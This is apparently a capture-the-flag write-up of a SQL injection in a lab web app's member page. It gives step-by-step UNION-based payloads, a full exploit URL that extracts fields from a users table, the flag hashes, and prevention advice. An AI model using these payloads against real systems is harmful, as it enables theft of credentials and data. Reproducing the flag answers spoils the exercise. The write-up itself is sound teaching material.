# SQL Injection Vulnerability in Member Page

## Overview

A **SQL Injection** vulnerability was identified on the `member` page. By manipulating the `id` parameter, an attacker can retrieve sensitive data (such as user credentials and database structure) from the underlying database.

## Steps to Reproduce

1. **Initial Test**

   - **Payload**: `2 OR 1=1 --`
   - **Goal**: Bypass logic to force the query to always return all users.

2. **Column Enumeration**

   - **Payload**: `2 ORDER BY 2 --`
   - **Goal**: Determine the number of columns.
   - Testing with `ORDER BY 3` triggered an error, confirming there are only 2 columns in the original query.

3. **Database Schema Enumeration**

   - **Payload**:
     ```sql
     1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns --
     ```
   - **Goal**: Enumerate all tables and columns in the database.
   - `1=2` ensures the initial query returns no rows, allowing the `UNION` part to expose database schema information.

4. **Extracting Sensitive Fields**

   - **Payload**:
     ```sql
     1 AND 1=2 UNION SELECT Commentaire, countersign FROM users --
     ```
   - **Goal**: Retrieve sensitive fields from the `users` table.

5. **Exploited URL**
   - **Payload** (URL-encoded):
     ```
     http://192.168.122.121/?page=member&id=1+AND+1%3D2+UNION+SELECT+Commentaire%2C+countersign+FROM+users+--&Submit=Submit#
     ```
   - **Parameter**: `id`
   - **Injection point**: `1+AND+1%3D2+UNION+SELECT+Commentaire%2C+countersign+FROM+users+--`

## Flag

- **Original**: `5ff9d0165b4f92b14994e5c685cdce28` (md5)
- **Converted**: `FortyTwo` (to convert in lower case)
- **To sha256**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## How to Prevent SQL Injections

1. **Parameterized Queries / Prepared Statements**

   - Use parameterized queries to automatically sanitize user inputs instead of manually constructing SQL strings.

2. **Input Validation**

   - Validate and sanitize user inputs to allow only expected data formats (e.g., numeric values for IDs).

3. **Use of an ORM (Object-Relational Mapping)**

   - Rely on established frameworks (e.g., Hibernate, Entity Framework, Django ORM) that handle SQL queries safely.

4. **Least Privilege Principle**

   - Restrict database user privileges to the bare minimum needed.

5. **Regular Updates and Patches**
   - Keep your frameworks, libraries, and database software up to date to benefit from the latest security fixes.
